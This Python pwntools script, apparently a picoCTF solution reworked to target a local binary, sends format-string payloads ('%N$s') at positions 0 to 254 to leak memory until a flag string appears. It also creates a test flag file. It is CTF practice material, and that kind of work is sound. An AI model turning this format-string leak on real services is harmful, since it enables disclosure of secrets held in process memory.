#!/usr/bin/env python3
from pwn import *

# Change target from remote to local binary
# host, port = 'saturn.picoctf.net', 55735  # Original remote target
binary_path = './neural'  # Local binary path

# Create flag.txt file as requested
with open('flag.txt', 'w') as f:
    f.write('CTF{test_flag_for_local_testing}\n')

for i in range(255):
    try:
        # Connect to local process instead of remote
        p = process(binary_path)
        # Alternative: if binary expects specific input file
        # p = process([binary_path, 'some_input_file'])
        
        # Wait for prompt (adjust based on your binary's output)
        p.recvuntil(b'> ')
        
        # Send format string payload
        payload = '%' + str(i) + '$s'
        p.sendline(payload.encode())
        
        # Receive response
        response = p.recv()
        
        # Check if flag is found
        if b"CTF" in response:
            print(f"Flag found at position {i}:")
            print(response.decode())
            p.close()
            break
            
        print(f"Position {i}: {response}")
        p.close()
        
    except Exception as e:
        print(f"Error at position {i}: {e}")
        try:
            p.close()
        except:
            pass

print("Exploit completed")
